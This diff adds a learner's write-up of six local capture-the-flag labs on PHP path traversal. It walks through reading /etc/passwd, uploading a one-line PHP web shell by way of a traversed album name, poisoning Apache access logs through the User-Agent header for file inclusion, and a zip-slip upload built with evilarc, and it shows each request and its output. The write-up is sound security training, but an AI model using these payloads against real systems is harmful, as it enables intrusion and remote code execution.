@@ -1,0 +1,412 @@
+[Level 1]
+
+[*] Target: http://localhost:8091
+
+    - In the index.php, we can see this in every icon
+
+        <a href="/loadImage.php?file_name=name.png" ...</a>
+
+    - And when we click on "View" => http://localhost:8091/loadImage.php?file_name=name.png
+
+    => This logic can bring us to the conclusion that loadImage.php can print out the files that are stored somewhere on the server
+
+    - Focus on the source code of loadImage.php
+
+        <?php 
+        $file_name = $_GET['file_name'];
+        $file_path = '/var/www/html/images/' . $file_name; // [?] Now we know the path of images we saw on the website
+        
+    // [?] But our target is /etc/passwd since 'RUN echo "CBJS{FAKE_FLAG_FAKE_FLAG}" >> /etc/passwd' is easy to see in the Dockerfile
+
+    // [?] => $file_path '/var/www/html/images/../../../../etc/passwd'
+
+        if (file_exists($file_path)) {
+            
+            header('Content-Type: image/png'); 
+            
+    // [?] This line will print out our file like an image so we can't just read it in a normal way
+            
+            readfile($file_path);
+        }
+        else { // Image file not found
+            echo " 404 Not Found";
+        }
+
+    [Final Result: Able to read file] curl localhost:8091/loadImage.php?file_name=../../../../etc/passwd
+
+                                                root:x:0:0:root:/root:/bin/bash
+                                                daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+                                                bin:x:2:2:bin:/bin:/usr/sbin/nologin
+                                                ...
+                                                nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+                                                _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+                                                CBJS{FAKE_FLAG_FAKE_FLAG}
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 2]
+
+[*] Target: http://localhost:8092
+
+    - This time index.php has a little bit different
+
+        <a href="/loadImage.php?file=images/name.png" ... </a>
+
+    - Not only the filename, this time it shows the folder too, since the current directory of the website looks like /var/www/html, I think the "file" parameter can show us 
+      any file we want to see, let's check it out
+
+        <?php 
+        $file = $_GET['file'];
+        if (strpos($file, "..") !== false) 
+        
+    // [?] if ".." is found in the filename this will print out "Hack detected"
+            
+            die("Hack detected");
+        
+        if (file_exists($file)) { // [?] Exactly what I thought it would print out any file we want because there are no limitations like level 1
+            header('Content-Type: image/png');
+            readfile($file);
+        }
+        else { // Image file not found
+            echo " 404 Not Found";
+        }?>
+
+    [Final Result: Able to read file] curl http://localhost:8092/loadImage.php?file=/etc/passwd
+
+                                                root:x:0:0:root:/root:/bin/bash
+                                                daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+                                                bin:x:2:2:bin:/bin:/usr/sbin/nologin
+                                                ...
+                                                nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+                                                _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+                                                CBJS{FAKE_FLAG_FAKE_FLAG}
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 3]
+
+[*] Target: http://localhost:8093
+
+    - This time, we should focus on the php code in the index.php
+        
+        ...
+            session_start();
+            if (!isset($_SESSION['dir'])) {
+
+                $_SESSION['dir'] = '/var/www/html/upload/' . bin2hex(random_bytes(16)); 
+            }
+            $dir = $_SESSION['dir'];
+
+            if ( !file_exists($dir) )
+                mkdir($dir);
+
+            if(isset($_FILES["files"]) && $_POST['album'] !="" ) {
+                try {
+
+                    $album = $dir . "/" . strtolower($_POST['album']);
+
+            // [?] Since we can upload files and this is a path traversal lab, I think we can RCE
+
+                    if ( !file_exists($album))
+                        mkdir($album);
+
+                    $files = $_FILES['files'];
+                    $count = count($files["name"]);
+                    
+                    for ($i = 0; $i < $count; $i++) {
+                        
+                        $newFile = $album . "/" . $files["name"][$i];
+
+                        move_uploaded_file($files["tmp_name"][$i], $newFile);
+                    }
+            ...
+
+     - This is my mindset => $album = /var/www/html/upload/123abc/../../payload.php
+
+     - So why do I have to do a path traversal, look at the apache2.conf and Dockerfile
+
+        [+] apache2.conf:
+
+                ...
+
+                <Directory "/var/www/html/upload/">
+                        AllowOverride None
+                        Require all granted
+                        ...
+                        Header set Content-Type application/octet-stream
+
+                        <FilesMatch ".+\.jpg$">
+                                Header set Content-Type image/jpeg
+                        </FilesMatch>
+                        <FilesMatch ".+\.png$">
+                                Header set Content-Type image/png
+                        </FilesMatch>
+                        <FilesMatch ".+\.(html|txt|php)"> 
+                                Header set Content-Type text/plain
+                        </FilesMatch>
+
+                </Directory>
+                ...
+
+            => This means that in the /var/www/html/upload/ every html, php, txt file can't be executed 
+            
+            => But why do I only recede 2 times /var/www/html/upload/123abc/../..
+
+        [+] Dockerfile:
+
+                COPY ./src /var/www/html
+
+                RUN chown -R root:www-data /var/www/html
+                RUN chmod 750 /var/www/html 
+                
+        // [?] The group (`www-data`) has read and execute permissions, allowing them to access and execute files within the directory
+
+                WORKDIR /var/www/html/
+                RUN find . -type f -exec chmod 640 {} \;
+                RUN find . -type d -exec chmod 750 {} \;
+
+                RUN chown -R root:www-data /var/www/html/upload
+                RUN chmod g+w /var/www/html/upload/
+
+                RUN chmod g+w /var/www/html/   // [?] This line allows the group to make changes and modify files, and this is the reason why
+
+    [Fun Fact] You may wonder why there is no .conf file with SetHandler, how can I know this lab allows us to RCE like the previous lesson
+
+        - There is no explicit `SetHandler` directive mentioned for running PHP. However, the ability to run PHP files is typically achieved by using the `mod_php` module, 
+          which handles the interpretation and execution of PHP code.
+          
+          When you have `mod_php` enabled and properly configured on your server, it automatically associates certain file extensions 
+          (such as `.php`, `.php5`, or `.phtml`) with the PHP interpreter. 
+          
+          This association allows Apache to recognize PHP files and pass them to the PHP interpreter for execution, 
+          without requiring an explicit `SetHandler` directive in the `httpd.conf` file.
+
+            root@4829864549ff:/var/www/html# locate php.conf
+
+                /etc/apache2/conf-available/docker-php.conf
+                /etc/apache2/conf-enabled/docker-php.conf
+
+            root@4829864549ff:/var/www/html# cat /etc/apache2/conf-available/docker-php.conf
+                
+                <FilesMatch \.php$> // [?] php only 
+                        SetHandler application/x-httpd-php
+                </FilesMatch>
+
+                DirectoryIndex disabled
+                DirectoryIndex index.php index.html
+
+                <Directory /var/www/>
+                        Options -Indexes
+                        AllowOverride All
+                </Directory>
+
+    - Create a simple php payload echo '<?php system($_REQUEST["cmd"]); ?>' > payload.php, then upload it
+
+        ...
+
+        -----------------------------158393940220373071483898317597
+        Content-Disposition: form-data; name="album"
+
+        ../..   
+        
+        // [?] Remember: $newFile = $album . "/" . $files["name"][$i];
+        
+        -----------------------------158393940220373071483898317597
+        Content-Disposition: form-data; name="files[]"; filename="payload.php"
+        Content-Type: application/x-php
+
+        <?php system($_REQUEST["cmd"]); ?>
+
+        -----------------------------158393940220373071483898317597--
+
+    - So now we uploaded the payload to the /var/www/html
+
+    [Final Result: RCE] http://localhost:8093/payload.php?cmd=id => uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 4]
+
+[*] Target: http://localhost:8094
+
+    - As you can see there are a lot of files at this level but in this lab, I think we only need to focus on game.php and profile.php
+
+    [+] Now look at the game.php:
+
+        ...
+            if (!isset($_GET['game'])) {
+                header('Location: /game.php?game=fatty-bird-1.html');
+                die();
+            }
+            $game = $_GET['game'];
+        ?>
+
+        <!DOCTYPE html>
+        <html lang="en">
+            <head>
+                <?php include './views/header.html'; ?>
+            </head>
+
+            ...
+
+                <br>
+                <div style="background-color: white; padding: 20px;">
+                    <?php include './views/' . $game; ?> // [?] => ./views/../../../../etc/passwd
+                </div>    
+
+    => http://localhost:8094/game.php?game=../../../../etc/passwd works perfectly
+
+    - I know path traversals worked but we still can perform an RCE attack at this level
+
+    - Pay attention to the profile.php
+
+        ...
+        $response = "";
+        if (isset($_FILES["fileUpload"])) {
+            move_uploaded_file($_FILES["fileUpload"]["tmp_name"], "/var/www/html/upload/" . $_SESSION["name"] . "/avatar.jpg");
+            $response = "Success";
+        }
+        ...
+        => So, any file we uploaded will be renamed to 'avatar.jpg' in the /var/www/html/upload/<username>/, no way to run
+
+        => BUT! remember "<?php include './views/' . $game; ?>" in the game.php, this is where magic happened 
+
+        [MAGIC] "includes" in php scans all the contents of the file then runs them, and doesn't rely on the extension of the file like in every other .conf
+
+        => Now, we all know that avatar.jpg is still executable, but we can't simply ?cmd=<command> like previous labs
+
+        => echo '<?php system("cat /secret.txt"); ?>' > Payload.php
+
+    [Final Result: RCE] http://localhost:8094/game.php?game=../upload/thinh/avatar.jpg => CBJS{FAKE_FLAG_FAKE_FLAG}
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 5]
+
+[*] Target: http://localhost:8095
+
+    - This level is gonna a little bit different, this time you should focus on the apache2.conf
+        ...
+        <Directory "/var/www/html/upload/">
+                AllowOverride None
+                Require all granteds
+
+                <FilesMatch ".*">
+                        SetHandler None
+                </FilesMatch>
+
+                Header set Content-Type application/octet-stream
+
+                <FilesMatch ".+\.jpg$">
+                        Header set Content-Type image/jpeg
+                </FilesMatch>
+                <FilesMatch ".+\.png$">
+                        Header set Content-Type image/png
+                </FilesMatch>
+                <FilesMatch ".+\.(html|txt|php)">
+                        Header set Content-Type text/plain => php extension is now useless
+                </FilesMatch>
+        ...
+
+    => And there is no place for us to upload a file, but there still be a way for us to RCE this lab, now look at the Dockerfile
+
+        ...
+        # Set up log files
+        RUN rm /var/log/apache2/access.log /var/log/apache2/error.log 
+        RUN touch /var/log/apache2/access.log /var/log/apache2/error.log
+        RUN chmod 777 /var/log/apache2/access.log /var/log/apache2/error.log 
+        RUN chown www-data:www-data /var/log/apache2/access.log /var/log/apache2/error.log
+
+        => We are now able to read, write, and execute commands from the access.log
+        ...
+
+        => Combine with this
+        ...
+                <div style="background-color: white; padding: 20px;">
+                    <?php include './views/' . $game; ?> // [?] Remember what "include()" can do (~.~?)
+                </div>
+        ...
+
+        => If you realize something, then congrats, this took me 1 day to find out we can execute commands from the access.log
+
+         => The only thing we can change without any problem is User-Agent header: 
+
+            GET /?game=fatty-bird-1.html HTTP/1.1
+            Host: localhost:8095
+            User-Agent: <?php system($_REQUEST[cmd]); ?>
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+            ...
+
+        =>  root@0b5dc550ba7c:/var/www/html# cat /var/log/apache2/access.log
+            ...
+            172.18.0.1 - ... "GET /?game=fatty-bird-1.html HTTP/1.1" 200 2824 "-" "<?php system($_REQUEST[cmd]); ?>"
+
+    [Final Result: RCE] http://localhost:8095/?game=../../../../var/log/apache2/access.log&cmd=id => ... uid=33(www-data) gid=33(www-data) groups=33(www-data) ...
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 6]
+
+[*] Target: http://localhost:8096
+
+    - Like all the final bosses in all the games we played, this is one of them. Now, look at the index.php
+
+    session_start();
+    if (!isset($_SESSION['dir'])) {
+
+        $_SESSION['dir'] = '/var/www/html/upload/' . bin2hex(random_bytes(16));
+    }
+    $dir = $_SESSION['dir'];
+
+    if ( !file_exists($dir) )
+        mkdir($dir);
+
+    if(isset($_FILES["file"]) ) {
+        try {
+          
+          $file_name = $_FILES["file"]["name"];
+          if(substr($file_name,-4,4) == ".zip")
+          {
+            $result = _unzip_file_ziparchive($_FILES["file"]["tmp_name"],$dir); 
+            
+    // [?] This will unzip the uploaded zip file to /var/www/html/upload/<randomchar>/
+          
+          }
+          else
+          {
+            $newFile = $dir . "/" . $file_name; 
+            move_uploaded_file($_FILES["file"]["tmp_name"], $newFile); // [?] move file to the /var/www/html/upload/test.php
+            
+    // [?] This is a good one! But after reading apache2.conf, nah still not executable in this case
+          
+          }
+
+       } catch(Exception $e) {
+            $error = $e->getMessage();
+         }
+    }
+    ...
+
+    => The mindset to solve this problem is to create a file name that contains a path traversal attack and zip it
+
+    => But you know, we can't just do it normally! However, you can use this tool https://github.com/ptoomey3/evilarc/blob/master/evilarc.py
+
+    // [?] This is an old tool, you might want to fix it a little bit so that python3 can work smoothly
+
+    # python3 tool.py ./payload.php --depth 2 --os unix --output-file troy.zip
+
+        Creating troy.zip containing ../../payload.php
+
+    => So! I uploaded the troy.zip and the back end extracted it successfully
+
+    [Final Result: RCE] http://localhost:8096/payload.php?cmd=id => uid=33(www-data) gid=33(www-data) groups=33(www-data) 
